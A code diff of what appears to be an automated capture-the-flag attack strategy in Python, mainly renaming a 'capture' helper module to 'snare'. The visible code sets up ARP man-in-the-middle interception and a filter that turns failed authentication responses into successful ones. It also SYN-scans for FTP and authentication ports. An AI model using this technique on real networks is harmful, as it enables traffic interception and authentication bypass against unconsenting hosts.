@@ -1,13 +1,12 @@
 # coding: utf-8
-import scapy.all as scapy
-import capture
-import strategy
-import logging
-import re
-import net
 import jwt
+import logging
 import random
+import re
+import scapy.all as scapy
+import snare
 import socket
+import strategy
 import time
 
 logger = logging.getLogger(__name__)
@@ -27,7 +26,7 @@ class Strategy(strategy.Strategy):
     scantimeout = 3
     flagpath = './secret/grandmas-praline-cheesecake.txt'
 
-    class AuthenticationFilter(capture.TcpFilter):
+    class AuthenticationFilter(snare.TcpFilter):
         """AuthenticationFilter replaces negative authentication responses with affirmative once an example has been recorded"""
         def __init__(self, port=4505):
             super().__init__()
@@ -48,8 +47,8 @@ class Strategy(strategy.Strategy):
             return pkt
 
     def execute(self, iface, flagpattern="flag\{.*?\}", canceltoken=None):
-        sniffer = capture.Sniffer(iface=iface)
-        mitm = capture.ArpMitmModule(filter=self.AuthenticationFilter(), iface=iface)
+        sniffer = snare.Sniffer(iface=iface)
+        mitm = snare.ArpMitmModule(filter=self.AuthenticationFilter(), iface=iface)
         sniffer.register(
             mitm
         )
@@ -79,7 +78,7 @@ class Strategy(strategy.Strategy):
                 for req, resp in ans:
                     if all(layer in resp for layer in (scapy.IP, scapy.TCP)):
                         tcp = resp[scapy.TCP]
-                        if tcp.flags == capture.TcpFlags.SYN | capture.TcpFlags.ACK:
+                        if tcp.flags == snare.TcpFlags.SYN | snare.TcpFlags.ACK:
                             if tcp.sport == 21:
                                 ftpserver = (resp[scapy.IP].src, 21)
                             elif tcp.sport == self.authport:
